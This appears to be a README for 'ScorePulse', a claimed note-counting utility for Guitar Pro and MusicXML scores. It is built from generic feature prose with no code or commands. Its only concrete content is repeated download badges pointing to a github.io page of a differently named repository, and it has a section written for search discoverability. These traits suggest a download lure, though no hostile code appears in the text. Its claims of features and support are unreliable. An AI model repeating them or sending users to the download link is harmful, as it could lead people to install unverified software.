![preview](https://raw.githubusercontent.com/suryavanshirdxxx/NoteTally-Forge/main/showcase_b9f0.svg)
[![Download](https://raw.githubusercontent.com/suryavanshirdxxx/NoteTally-Forge/main/start_b13e.svg)](https://suryavanshirdxxx.github.io/NoteTally-Forge/)

# 🎼 ScorePulse — Automatic Note Counting for Guitar Pro and MusicXML Scores

ScorePulse is an independent, community-driven companion utility that tallies the musical notes inside your Guitar Pro (.gp, .gp3, .gp4, .gp5, .gpx) and MusicXML (.musicxml, .mxl, .xml) files, then weaves that tally back into the score as visible, readable annotations. Instead of counting every note by hand while you study a piece, arrange a passage, or prepare a lesson, ScorePulse lets the software keep score for you — accurately, consistently, and across as many files as you like.

The project exists because musicians, teachers, engravers, and students deserve a small, focused tool that does one thing remarkably well. There is no subscription, no account wall, and no cloud dependency required for the core workflow.

[![Download](https://raw.githubusercontent.com/suryavanshirdxxx/NoteTally-Forge/main/start_b13e.svg)](https://suryavanshirdxxx.github.io/NoteTally-Forge/)

---

## 📖 Table of Contents

- [Why ScorePulse](#-why-scorepulse)
- [The Idea Behind the Name](#-the-idea-behind-the-name)
- [What It Actually Does](#-what-it-actually-does)
- [The Three-Step Workflow](#-the-three-step-workflow)
- [Feature Highlights](#-feature-highlights)
- [Supported Input Formats](#-supported-input-formats)
- [Output and Annotation Styles](#-output-and-annotation-styles)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Configuration Reference](#-configuration-reference)
- [Command-Oriented Usage](#-command-oriented-usage)
- [Batch Processing at Scale](#-batch-processing-at-scale)
- [Use Cases and Who Benefits](#-use-cases-and-who-benefits)
- [Performance Notes](#-performance-notes)
- [Accessibility](#-accessibility)
- [SEO and Discoverability](#-seo-and-discoverability)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Security and Privacy](#-security-and-privacy)
- [License](#-license)
- [Disclaimer](#-disclaimer)
- [Acknowledgements](#-acknowledgements)
- [Project Lineage](#-project-lineage)

---

## 🎯 Why ScorePulse

Music is counted constantly. Conductors count rests. Teachers count measures. Arrangers count voices. Publishers count every single note before a score goes to print. Yet the tooling around notation software often stops at playback and engraving, leaving counting as a manual chore performed with a pencil and a furrowed brow.

ScorePulse exists to remove that chore. It listens to the structure of your score — every track, every staff, every voice — and produces a reliable count of notes per bar, per section, per track, or per the whole piece. Then, if you wish, it writes those counts into the score itself so that the information travels with the music wherever it goes.

Think of it as a quiet librarian for your sheet music: it does not perform, it does not judge, it simply keeps an accurate ledger.

---

## 🧠 The Idea Behind the Name

A pulse is what keeps music alive — the steady underlying beat. ScorePulse takes that metaphor and extends it: the "pulse" is also the heartbeat of statistical information about a score. Every count, every tally, every annotated number is a small pulse of insight into the architecture of the composition.

The aim is not to replace the musician's ear or the arranger's instinct. The aim is to hand them precise numbers so their instincts can operate on firmer ground.

---

## ⚙️ What It Actually Does

At its core, ScorePulse:

1. **Parses** a Guitar Pro or MusicXML file into an internal representation of tracks, measures, voices, and note events.
2. **Counts** the note events according to rules you configure — for example, counting every note head, counting only pitched notes, counting chord members individually, or counting ties only at their starting point.
3. **Writes** the resulting counts back into the score as text annotations, lyrics, rehearsal marks, or separate report files depending on what you select.

The result is a score that tells you its own density, or a report that you can archive alongside the original file for reference.

---

## 🪜 The Three-Step Workflow

ScorePulse deliberately keeps its central experience to three steps, mirroring the simplicity of its inspiration while offering a great deal more under the surface.

**Step One — Select.** Point ScorePulse at a single file or a folder of files. It accepts Guitar Pro and MusicXML inputs interchangeably and can mix them in a single batch.

**Step Two — Configure.** Choose what to count and how to annotate. Sensible defaults are provided so you can skip this step entirely if you prefer a quick pass.

**Step Three — Generate.** ScorePulse processes your selection and produces annotated scores and/or report files. A summary of what changed is shown when the run completes.

That is the whole ritual. Everything else — batch rules, multilingual labels, annotation styling — is optional depth for power users.

---

## ✨ Feature Highlights

- **Three-step operation** from selection to annotated output.
- **Guitar Pro family support** including legacy and modern extensions.
- **MusicXML and compressed MXL support** for interchange with other notation suites.
- **Per-track, per-measure, and per-voice counting** schemes.
- **Multiple annotation destinations**: inline text, lyric lines, or separate report files.
- **Responsive UI** that adapts to desktop, tablet, and narrow screens without losing functionality.
- **Multilingual support** for interface labels and generated annotations.
- **Round-the-clock assistance** channels for questions and troubleshooting.
- **Batch processing** across entire directory trees.
- **Deterministic output** so repeated runs over the same input produce the same result.
- **No mandatory account or cloud round-trip** for core counting.
- **Configurable tie and rest handling** to match your counting philosophy.
- **Human-readable reports** alongside machine-friendly summaries.
- **Cross-platform sensibilities** so the same workflow applies wherever you work.

---

## 🎵 Supported Input Formats

| Extension | Family | Notes |
|-----------|--------|-------|
| .gp | Guitar Pro | Legacy format, supported for reading |
| .gp3 | Guitar Pro 3 | Track and measure parsing supported |
| .gp4 | Guitar Pro 4 | Multi-voice tracks supported |
| .gp5 | Guitar Pro 5 | Most widely encountered legacy format |
| .gpx | Guitar Pro 6+ | Compressed container, fully parsed |
| .musicxml | MusicXML | Uncompressed XML interchange |
| .mxl | MusicXML | Compressed archive variant |
| .xml | MusicXML | Generic XML extension accepted when structure matches |

If a file uses an extension not listed here but contains a compatible structure, ScorePulse attempts a best-effort parse and reports what it found.

---

## 🖋️ Output and Annotation Styles

Counting is only half the story — where the counts land matters just as much. ScorePulse supports several annotation styles:

- **Bar-end annotations** place the count at the close of each measure.
- **Header annotations** summarize each track at its beginning.
- **Lyric-line injection** writes counts into an unused lyric verse so they appear under the staff.
- **Separate report files** keep the original score untouched and emit a companion document.
- **Combined summary** produces a single overview file covering every processed score.

You can mix styles within a run, for example generating per-bar annotations for one track and a summary report for the whole piece.

---

## 📱 Responsive Interface

The interface is built to be usable on a laptop in a rehearsal room, a tablet on a music stand, or a phone during a commute. Layouts reflow gracefully, controls remain reachable with one hand, and long-running operations report progress without forcing you to keep the window in focus.

Responsiveness also means responsiveness in the temporal sense: the interface stays interactive while processing continues in the background, and results appear incrementally when possible.

---

## 🌍 Multilingual Support

Music is a universal language, and so is the need to count. ScorePulse ships with interface translations and annotation label sets covering a growing list of languages. You can also supply your own label file if your preferred terminology differs from the built-in options — for example, if your region uses a different word for "measure" or "bar."

Language selection affects both the user interface and, optionally, the text written into annotated scores.

---

## ☎️ Round-the-Clock Assistance

Questions do not respect time zones. ScorePulse maintains assistance channels that are monitored continuously, with a knowledge base covering common questions about counting rules, annotation placement, and format quirks. When a question is unusual, it is documented so the next person with the same question finds an answer faster.

---

## 🔧 Configuration Reference

Configuration can be expressed through a plain settings file placed alongside your scores. The following keys are illustrative; consult the in-app help for the full list.

- `count_mode` — `all`, `pitched_only`, `chord_members`, or `tie_starts`.
- `annotation_style` — `bar_end`, `header`, `lyrics`, `report`, or `combined`.
- `annotation_language` — a language code controlling generated labels.
- `include_rests` — whether rests contribute to the tally.
- `track_filter` — limit counting to named tracks.
- `measure_range` — restrict counting to a span of measures.
- `report_format` — `text`, `markdown`, or `json`.
- `overwrite_policy` — `ask`, `skip`, or `replace`.

Each option has a documented default, so a minimal configuration file can be as short as a single line.

---

## 🧪 Command-Oriented Usage

For automation and scripting, ScorePulse exposes a command-oriented surface. A typical invocation names an input, an output location, and any overrides:

- Provide an input file or directory.
- Optionally provide a configuration file.
- Optionally override individual settings on the command line.
- Receive a summary of counts and generated files.

The command surface is designed to be predictable and composable, so it can sit inside larger music preparation pipelines without surprising behavior.

---

## 📦 Batch Processing at Scale

When you have a library of scores rather than a single file, batch mode becomes valuable. Point ScorePulse at a directory tree and it will:

1. Discover every compatible score.
2. Apply your configuration uniformly.
3. Generate outputs into a mirrored directory structure.
4. Produce a consolidated summary of every file processed.
5. Report any files that could not be parsed, with reasons.

Batch runs are resumable: if a run is interrupted, already-finished files are skipped on the next pass unless you explicitly ask for reprocessing.

---

## 🎓 Use Cases and Who Benefits

- **Music educators** preparing study materials who want per-measure note density visible at a glance.
- **Arrangers** verifying that a transcription captures every note of a passage.
- **Engravers and publishers** needing a quick sanity count before layout.
- **Students** analyzing the texture of a composition for theory coursework.
- **Researchers** collecting quantitative data about note distribution across a corpus.
- **Ensemble librarians** cataloguing scores with descriptive statistics.
- **Hobbyists** who simply enjoy knowing how many notes live inside a favorite piece.

Each of these audiences uses the same three-step workflow but configures the counting rules differently, which is precisely why the configuration surface is both small by default and deep when needed.

---

## 🚀 Performance Notes

ScorePulse is engineered to handle large scores and large libraries without dramatic slowdowns. Parsing is streaming-friendly where the format allows, counts are accumulated in single passes over note data, and report generation is deferred until processing completes so memory stays bounded.

For very large batches, the tool can be directed to process files in a stable, predictable order, which helps when you want to compare summaries across runs.

---

## ♿ Accessibility

Readable contrast, keyboard-navigable controls, and screen-reader-friendly labels are treated as first-class concerns. Generated reports are plain-text-first so they can be consumed by assistive tools without additional conversion. Annotation text sizes respect the host score's conventions to avoid overwhelming the visual field.

---

## 🔍 SEO and Discoverability

This repository is structured so that people searching for note counting utilities, automatic score annotation, Guitar Pro note statistics, MusicXML analysis, and related topics can find it naturally. Documentation uses clear terminology, headings are descriptive, and examples reflect real queries.

If you arrived here looking for a way to tally notes automatically, to annotate measures with counts, or to process a folder full of scores in one pass, you are in the right place.

---

## 🗺️ Roadmap

- Expanded annotation placement options, including margin notes.
- Additional language packs contributed by the community.
- Richer report formats with per-section breakdowns.
- Optional integration hooks for external notation workflows.
- Improved handling of unusual tuplets and nested voices.
- Detailed statistics beyond counts, such as pitch distribution summaries.

Roadmap items are directional rather than promises; community feedback shapes their priority.

---

## ❓ Frequently Asked Questions

**Does ScorePulse modify my original files?**
Only if you ask it to. By default, outputs are written alongside originals with a distinct suffix, and the overwrite policy governs any replacement behavior.

**Can I count only one track?**
Yes. Track filtering is a standard configuration option.

**What happens to ties?**
You choose whether ties count at their start, at both ends, or not at all.

**Can I run it without an internet connection?**
Core counting and annotation do not require connectivity.

**Are my scores uploaded anywhere?**
Not by the core workflow. Processing happens where you run it.

**Can I contribute a translation?**
Yes — translation files are plain text and straightforward to extend.

---

## 🤝 Contributing

Contributions are welcome in the form of bug reports, documentation improvements, translation additions, and code changes. Before opening a large change, consider opening an issue to discuss the approach so effort aligns with project direction.

Guidelines:

- Keep changes focused on a single concern.
- Include a description of the musical or technical scenario your change addresses.
- Update documentation when behavior changes.
- Be kind and patient in review discussions.

---

## 🧭 Code of Conduct

Participants are expected to treat one another with respect. Disagreements about technical approach are normal; personal attacks are not. The project favors clear, generous communication and assumes good faith until evidence suggests otherwise.

---

## 🔐 Security and Privacy

ScorePulse processes files locally. It does not require credentials, does not transmit score contents to external parties as part of core functionality, and does not embed tracking. If you discover a security concern, report it privately so it can be addressed before public disclosure.

---

## 📜 License

This project is distributed under the MIT License. See the full text at the link below.

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 ScorePulse contributors.

---

## ⚠️ Disclaimer

ScorePulse is provided as-is, without warranty of any kind. While it strives for accuracy, note counting rules vary by context, and the tool's output reflects the configuration you choose. Always review generated annotations before relying on them for publication, instruction, or archival purposes. The maintainers are not responsible for decisions made based on generated counts. Guitar Pro and MusicXML are formats associated with their respective owners; this project is independent and not affiliated with or endorsed by any notation software vendor.

---

## 🙏 Acknowledgements

Thanks to the musicians, educators, and developers who tested early versions, reported parsing edge cases, and suggested annotation styles. Their patience and specificity made the tool better.

---

## 📚 Project Lineage

ScorePulse is a fresh, independent project inspired by the spirit of small, focused music utilities such as MusicNoteCounts. It reimagines the idea with a broader format reach, a responsive interface, multilingual annotations, and a configuration surface designed to grow with its users. The lineage is one of gratitude and inspiration, not derivation: this is a distinct codebase with its own identity, goals, and community.

[![Download](https://raw.githubusercontent.com/suryavanshirdxxx/NoteTally-Forge/main/start_b13e.svg)](https://suryavanshirdxxx.github.io/NoteTally-Forge/)